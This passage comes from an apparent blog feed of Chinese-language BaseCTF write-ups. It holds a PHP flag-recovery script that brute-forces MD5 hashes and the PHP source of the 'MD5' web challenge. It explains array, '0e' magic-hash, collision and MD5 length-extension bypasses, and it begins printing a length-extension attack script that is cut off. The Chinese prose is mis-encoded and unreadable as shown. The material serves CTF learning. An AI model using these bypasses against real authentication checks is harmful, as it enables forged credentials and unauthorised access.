class="string">&quot;e2c420d928d4bf8ce0ff2ec19b371514&quot;</span><span class="punctuation">,</span><span class="string">&quot;43ec517d68b6edd3015b3edc9a11367b&quot;</span><span class="punctuation">,</span><span class="string">&quot;ea5d2f1c4608232e07d3aa3d998e5135&quot;</span><span class="punctuation">,</span><span class="string">&quot;c8ffe9a587b126f152ed3d89a146b445&quot;</span><span class="punctuation">,</span><span class="string">&quot;7f39f8317fbdb1988ef4c628eba02591&quot;</span><span class="punctuation">,</span><span class="string">&quot;642e92efb79421734881b53e1e1b18b6&quot;</span><span class="punctuation">,</span><span class="string">&quot;9f61408e3afb633e50cdf1b20de6f466&quot;</span><span class="punctuation">,</span><span class="string">&quot;9f61408e3afb633e50cdf1b20de6f466&quot;</span><span class="punctuation">,</span><span class="string">&quot;2723d092b63885e0d7c260cc007e8b9d&quot;</span><span class="punctuation">,</span><span class="string">&quot;72b32a1f754ba1c09b3695e0cb6cde7f&quot;</span><span class="punctuation">,</span><span class="string">&quot;03afdbd66e7929b125f8597834fa83a4&quot;</span><span class="punctuation">,</span><span class="string">&quot;b53b3a3d6ab90ce0268229151c9bde11&quot;</span><span class="punctuation">,</span><span class="string">&quot;7f39f8317fbdb1988ef4c628eba02591&quot;</span><span class="punctuation">,</span><span class="string">&quot;c45147dee729311ef5b5c3003946c48f&quot;</span><span class="punctuation">,</span><span class="string">&quot;2b44928ae11fb9384c4cf38708677c48&quot;</span><span class="punctuation">,</span><span class="string">&quot;a1d0c6e83f027327d8461063f4ac58a6&quot;</span><span class="punctuation">,</span><span class="string">&quot;7f6ffaa6bb0b408017b62254211691b5&quot;</span><span class="punctuation">,</span><span class="string">&quot;9f61408e3afb633e50cdf1b20de6f466&quot;</span><span class="punctuation">,</span><span class="string">&quot;e369853df766fa44e1ed0ff613f563bd&quot;</span><span class="punctuation">,</span><span class="string">&quot;73278a4a86960eeb576a8fd4c9ec6997&quot;</span><span class="punctuation">,</span><span class="string">&quot;6c8349cc7260ae62e3b1396831a8398f&quot;</span><span class="punctuation">,</span><span class="string">&quot;6c8349cc7260ae62e3b1396831a8398f&quot;</span><span class="punctuation">,</span><span class="string">&quot;b53b3a3d6ab90ce0268229151c9bde11&quot;</span><span class="punctuation">,</span><span class="string">&quot;1c383cd30b7c298ab50293adfecb7b18&quot;</span><span class="punctuation">,</span><span class="string">&quot;17e62166fc8586dfa4d1bc0e1742c08b&quot;</span><span class="punctuation">,</span><span class="string">&quot;19ca14e7ea6328a42e0eb13d585e4c22&quot;</span><span class="punctuation">,</span><span class="string">&quot;d67d8ab4f4c10bf22aa353e27879133c&quot;</span><span class="punctuation">,</span><span class="string">&quot;c0c7c76d30bd3dcaefc96f40275bdc0a&quot;</span><span class="punctuation">,</span><span class="string">&quot;14bfa6bb14875e45bba028a21ed38046&quot;</span><span class="punctuation">,</span><span class="string">&quot;ea5d2f1c4608232e07d3aa3d998e5135&quot;</span><span class="punctuation">,</span><span class="string">&quot;e2c420d928d4bf8ce0ff2ec19b371514&quot;</span><span class="punctuation">,</span><span class="string">&quot;ea5d2f1c4608232e07d3aa3d998e5135&quot;</span><span class="punctuation">,</span><span class="string">&quot;6f4922f45568161a8cdf4ad2299f6d23&quot;</span><span class="punctuation">,</span><span class="string">&quot;e2c420d928d4bf8ce0ff2ec19b371514&quot;</span><span class="punctuation">,</span><span class="string">&quot;c74d97b01eae257e44aa9d5bade97baf&quot;</span><span class="punctuation">,</span><span class="string">&quot;735b90b4568125ed6c3f678819b6e058&quot;</span><span class="punctuation">,</span><span class="string">&quot;6ea9ab1baa0efb9e19094440c317e21b&quot;</span><span class="punctuation">,</span><span class="string">&quot;ad61ab143223efbc24c7d2583be69251&quot;</span><span class="punctuation">,</span><span class="string">&quot;1f0e3dad99908345f7439f8ffabdffc4&quot;</span><span class="punctuation">,</span><span class="string">&quot;1f0e3dad99908345f7439f8ffabdffc4&quot;</span><span class="punctuation">,</span><span class="string">&quot;43ec517d68b6edd3015b3edc9a11367b&quot;</span><span class="punctuation">]</span></span><br></pre></td></tr></table></figure><p>ç”¨pythonå†™è„šæœ¬è¿˜åŸflagä¸çŸ¥é“ä¸ºå•¥ä¸è¡Œï¼Œè¿™é‡Œç”¨phpå†™ä¸€ä¸ªè„šæœ¬</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å°†jsonæ•°æ®æ•´ç†æˆæ•°ç»„å½¢å¼</span></span><br><span class="line"><span class="variable">$json_data</span> = [</span><br><span class="line">    <span class="string">&quot;3295c76acbf4caaed33c36b1b5fc2cb1&quot;</span>, <span class="string">&quot;26657d5ff9020d2abefe558796b99584&quot;</span>,</span><br><span class="line">    <span class="string">&quot;73278a4a86960eeb576a8fd4c9ec6997&quot;</span>, <span class="string">&quot;ec8956637a99787bd197eacd77acce5e&quot;</span>,</span><br><span class="line">    <span class="string">&quot;e2c420d928d4bf8ce0ff2ec19b371514&quot;</span>, <span class="string">&quot;43ec517d68b6edd3015b3edc9a11367b&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ea5d2f1c4608232e07d3aa3d998e5135&quot;</span>, <span class="string">&quot;c8ffe9a587b126f152ed3d89a146b445&quot;</span>,</span><br><span class="line">    <span class="string">&quot;f457c545a9ded88f18ecee47145a72c0&quot;</span>, <span class="string">&quot;03afdbd66e7929b125f8597834fa83a4&quot;</span>,</span><br><span class="line">    <span class="string">&quot;093f65e080a295f8076b1c5722a46aa2&quot;</span>, <span class="string">&quot;03afdbd66e7929b125f8597834fa83a4&quot;</span>,</span><br><span class="line">    <span class="string">&quot;698d51a19d8a121ce581499d7b701668&quot;</span>, <span class="string">&quot;d82c8d1619ad8176d665453cfb2e55f0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;b53b3a3d6ab90ce0268229151c9bde11&quot;</span>, <span class="string">&quot;9f61408e3afb633e50cdf1b20de6f466&quot;</span>,</span><br><span class="line">    <span class="string">&quot;7f39f8317fbdb1988ef4c628eba02591&quot;</span>, <span class="string">&quot;07e1cd7dca89a1678042477183b7ac3f&quot;</span>,</span><br><span class="line">    <span class="string">&quot;a1d0c6e83f027327d8461063f4ac58a6&quot;</span>, <span class="string">&quot;7f6ffaa6bb0b408017b62254211691b5&quot;</span>,</span><br><span class="line">    <span class="string">&quot;d67d8ab4f4c10bf22aa353e27879133c&quot;</span>, <span class="string">&quot;9f61408e3afb633e50cdf1b20de6f466&quot;</span>,</span><br><span class="line">    <span class="string">&quot;e369853df766fa44e1ed0ff613f563bd&quot;</span>, <span class="string">&quot;5fd0b37cd7dbbb00f97ba6ce92bf5add&quot;</span>,</span><br><span class="line">    <span class="string">&quot;67c6a1e7ce56d3d6fa748ab6d9af3fd7&quot;</span>, <span class="string">&quot;3416a75f4cea9109507cacd8e2f2aefc&quot;</span>,</span><br><span class="line">    <span class="string">&quot;b53b3a3d6ab90ce0268229151c9bde11&quot;</span>, <span class="string">&quot;1c383cd30b7c298ab50293adfecb7b18&quot;</span>,</span><br><span class="line">    <span class="string">&quot;3416a75f4cea9109507cacd8e2f2aefc&quot;</span>, <span class="string">&quot;da4fb5c6e93e74d3df8527599fa62642&quot;</span>,</span><br><span class="line">    <span class="string">&quot;c8ffe9a587b126f152ed3d89a146b445&quot;</span>, <span class="string">&quot;c0c7c76d30bd3dcaefc96f40275bdc0a&quot;</span>,</span><br><span class="line">    <span class="string">&quot;735b90b4568125ed6c3f678819b6e058&quot;</span>, <span class="string">&quot;14bfa6bb14875e45bba028a21ed38046&quot;</span>,</span><br><span class="line">    <span class="string">&quot;fc490ca45c00b1249bbe3554a4fdf6fb&quot;</span>, <span class="string">&quot;37693cfc748049e45d87b8c7d8b9aacd&quot;</span>,</span><br><span class="line">    <span class="string">&quot;37693cfc748049e45d87b8c7d8b9aacd&quot;</span>, <span class="string">&quot;98f13708210194c475687be6106a3b84&quot;</span>,</span><br><span class="line">    <span class="string">&quot;3c59dc048e8850243be8079a5c74d079&quot;</span>, <span class="string">&quot;fc490ca45c00b1249bbe3554a4fdf6fb&quot;</span>,</span><br><span class="line">    <span class="string">&quot;33e75ff09dd601bbe69f351039152189&quot;</span>, <span class="string">&quot;4e732ced3463d06de0ca9a15b6153677&quot;</span>,</span><br><span class="line">    <span class="string">&quot;33e75ff09dd601bbe69f351039152189&quot;</span>, <span class="string">&quot;c16a5320fa475530d9583c34fd356ef5&quot;</span>,</span><br><span class="line">    <span class="string">&quot;43ec517d68b6edd3015b3edc9a11367b&quot;</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç”¨äºå­˜å‚¨è¿˜åŸå‡ºçš„å­—ç¬¦</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æšä¸¾æ³•è¿˜åŸflagå­—ç¬¦</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="title function_ invoke__">count</span>(<span class="variable">$json_data</span>); <span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span>&lt;<span class="number">256</span>; <span class="variable">$j</span>++)&#123;</span><br><span class="line">        <span class="variable">$xor_result</span> = <span class="variable">$j</span> ^ <span class="variable">$i</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$xor_result</span>) == <span class="variable">$json_data</span>[<span class="variable">$i</span>])&#123;</span><br><span class="line">            <span class="variable">$flag</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$j</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> BaseCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BaseCTF wp(week2)</title>
      <link href="/2024/09/11/BaseCTF-week2/"/>
      <url>/2024/09/11/BaseCTF-week2/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="æ‰€ä»¥è¯´ä½ å¾ˆæ‡‚MD5"><a href="#æ‰€ä»¥è¯´ä½ å¾ˆæ‡‚MD5" class="headerlink" title="æ‰€ä»¥è¯´ä½ å¾ˆæ‡‚MD5"></a>æ‰€ä»¥è¯´ä½ å¾ˆæ‡‚MD5</h3><p>é¢˜ç›®æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// æ‰€ä»¥ä½ è¯´ä½ æ‡‚ MD5 äº†?</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$apple</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;apple&#x27;</span>];</span><br><span class="line"><span class="variable">$banana</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;banana&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!(<span class="variable">$apple</span> !== <span class="variable">$banana</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$apple</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$banana</span>))) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;åŠ å¼ºéš¾åº¦å°±ä¸ä¼šäº†?&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä»€ä¹ˆ? ä½ ç»•è¿‡å»äº†?</span></span><br><span class="line"><span class="comment">// åŠ å¤§å‰‚é‡!</span></span><br><span class="line"><span class="comment">// æˆ‘è¦è®©ä»–æˆä¸º string</span></span><br><span class="line"><span class="variable">$apple</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;appple&#x27;</span>];</span><br><span class="line"><span class="variable">$banana</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;bananana&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!((<span class="keyword">string</span>)<span class="variable">$apple</span> !== (<span class="keyword">string</span>)<span class="variable">$banana</span> &amp;&amp; <span class="title function_ invoke__">md5</span>((<span class="keyword">string</span>)<span class="variable">$apple</span>) == <span class="title function_ invoke__">md5</span>((<span class="keyword">string</span>)<span class="variable">$banana</span>))) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;éš¾å—?ä¸éš¾!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½ è¿˜æ˜¯ç»•è¿‡å»äº†?</span></span><br><span class="line"><span class="comment">// å“¦å“¦å“¦, æˆ‘å°‘äº†ä¸€ä¸ªç­‰äºå·</span></span><br><span class="line"><span class="variable">$apple</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;apppple&#x27;</span>];</span><br><span class="line"><span class="variable">$banana</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;banananana&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!((<span class="keyword">string</span>)<span class="variable">$apple</span> !== (<span class="keyword">string</span>)<span class="variable">$banana</span> &amp;&amp; <span class="title function_ invoke__">md5</span>((<span class="keyword">string</span>)<span class="variable">$apple</span>) === <span class="title function_ invoke__">md5</span>((<span class="keyword">string</span>)<span class="variable">$banana</span>))) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;å˜»å˜», ä¸ä¼šäº†? æ²¡çœ‹ç›´æ’­å›æ”¾?&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½ ä»¥ä¸ºè¿™å°±ç»“æŸäº†</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;random&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;random&#x27;</span>] = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">16</span>)) . <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">16</span>)) . <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">16</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½ æƒ³çœ‹åˆ° random çš„å€¼å—?</span></span><br><span class="line"><span class="comment">// ä½ ä¸æ˜¯å¾ˆæ‡‚ MD5 å—? é‚£æˆ‘å°±å‘Šè¯‰ä½ ä»–çš„ MD5 å§</span></span><br><span class="line"><span class="variable">$random</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;random&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$random</span>); <span class="comment">//é¢˜ç›®ç»™å‡ºhashå€¼ä¸º66413c749dcb99fad13263f16a164bf2</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>] ?? <span class="string">&#x27;user&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// check if name ends with &#x27;admin&#x27;</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="variable">$name</span>, -<span class="number">5</span>) !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;ä¸æ˜¯ç®¡ç†å‘˜ä¹Ÿæ¥å‡‘çƒ­é—¹?&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$md5</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$random</span> . <span class="variable">$name</span>) !== <span class="variable">$md5</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;ä¼ªé€ ? NO NO NO!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è®¤è¾“äº†, çœ‹æ ·å­ä½ çœŸçš„å¾ˆæ‡‚ MD5</span></span><br><span class="line"><span class="comment">// é‚£ flag å°±ç»™ä½ å§</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;çœ‹æ ·å­ä½ çœŸçš„å¾ˆæ‡‚ MD5&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>); åŠ å¼ºéš¾åº¦å°±ä¸ä¼šäº†?</span><br></pre></td></tr></table></figure><p>appleä¸bananaå‚æ•°ä½¿ç”¨æ•°ç»„ç»•è¿‡</p><p>apppleä¸banananaå‚æ•°ä½¿ç”¨0eç»•è¿‡</p><p>appppleä¸bananananaå‚æ•°ä½¿ç”¨md5ç¢°æ’ç»•è¿‡ï¼Œå€ŸåŠ©fastcodeå·¥å…·ç”Ÿæˆä¸¤ä¸ªmd5ç›¸åŒçš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå†ç”¨è„šæœ¬å°†å…¶è½¬ä¸ºurlç¼–ç å³å¯ä½¿ç”¨</p><p>ä¸‹æ–‡è¡¥å……ä¸Šmd5ç»•è¿‡çŸ¥è¯†ç‚¹</p><p>æ¥ä¸‹æ¥æ¶‰åŠæ–°çš„çŸ¥è¯†ç‚¹ï¼Œå…ˆä»ä»£ç åˆ†æå¼€å§‹</p><p>å…³é”®ä»£ç åˆ†æ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;random&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;random&#x27;</span>] = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">16</span>)) . <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">16</span>)) . <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">16</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$random</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;random&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$random</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>] ?? <span class="string">&#x27;user&#x27;</span>;<span class="comment">//æ²¡æœ‰ä¼ å‚çš„è¯ä¼šå°†$nameèµ‹å€¼ä¸º&#x27;user&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="variable">$name</span>, -<span class="number">5</span>) !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;ä¸æ˜¯ç®¡ç†å‘˜ä¹Ÿæ¥å‡‘çƒ­é—¹?&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$md5</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$random</span> . <span class="variable">$name</span>) !== <span class="variable">$md5</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;ä¼ªé€ ? NO NO NO!&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>1.å…¨å±€å˜é‡randomæœ‰ä¸‰ä¸ªbin2hex(random_bytes(16))äº§ç”Ÿï¼Œä¹Ÿå°±æ˜¯32*3&#x3D;96ä¸ªå­—ç¬¦ï¼š</p><p>â€‹    bin2hex()æ˜¯ä¸€ä¸ªphpå‡½æ•°ï¼Œç”¨äºå°†äºŒè¿›åˆ¶æ•°æ®çš„å­—èŠ‚è½¬æ¢æˆä¸¤ä½çš„16è¿›åˆ¶æ•°ï¼Œrandom_bytes(16)ç”¨äºç”Ÿæˆ16å­—èŠ‚çš„éšæœºå­—èŠ‚åºåˆ—ï¼Œä¸¤è€…é…åˆä½¿ç”¨ä¼šç”Ÿæˆ32ä½16è¿›åˆ¶å­—ç¬¦ä¸²</p><p>2.if(substr($name, -5) !&#x3D;&#x3D; â€˜adminâ€™)åˆ¤æ–­nameå‚æ•°æœ«å°¾äº”ä½æ˜¯å¦ä¸ºadminå­—ç¬¦ä¸²</p><p>3.if(md5($random.$name) !&#x3D;&#x3D; $md5)å…·æœ‰æ˜æ˜¾å“ˆå¸Œé•¿åº¦æ‹“å±•æ”»å‡»ç‰¹å¾ï¼Œç”¨äºæ£€æŸ¥æ”»å‡»æ˜¯å¦æˆåŠŸ</p><p>md5é•¿åº¦æ‹“å±•æ”»å‡»åŸç†è§ä¸‹é¢ç½‘å€:</p><p><a href="https://luoingly.top/post/md5-length-extension-attack/">https://luoingly.top/post/md5-length-extension-attack/</a></p><p><a href="https://www.cnblogs.com/yunen/p/13624595.html">https://www.cnblogs.com/yunen/p/13624595.html</a></p><p><a href="https://delete.love/posts/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA-hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/">https://delete.love/posts/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA-hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/</a></p><p>ç¯‡å¹…é—®é¢˜è¿™é‡Œåªè®°å½•å·¥å…·ç”¨æ³•ï¼ˆå·¥å…·å·²æ³¨æ˜å‡ºå¤„ï¼‰</p><p>æœ¬é¢˜ä½¿ç”¨å·¥å…·:<a href="https://github.com/luoingly/attack-scripts/blob/main/logic/md5-extension-attack.py">https://github.com/luoingly/attack-scripts/blob/main/logic/md5-extension-attack.py</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack, unpack</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> floor, sin</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">MD5 Extension Attack</span></span><br><span class="line"><span class="string">====================</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@refs</span></span><br><span class="line"><span class="string">https://github.com/shellfeel/hash-ext-attack</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MD5</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.A, <span class="variable language_">self</span>.B, <span class="variable language_">self</span>.C, <span class="variable language_">self</span>.D = \</span><br><span class="line">            (<span class="number">0x67452301</span>, <span class="number">0xefcdab89</span>, <span class="number">0x98badcfe</span>, <span class="number">0x10325476</span>)  <span class="comment"># initial values</span></span><br><span class="line">        <span class="variable language_">self</span>.r: <span class="built_in">list</span>[<span class="built_in">int</span>] = \</span><br><span class="line">            [<span 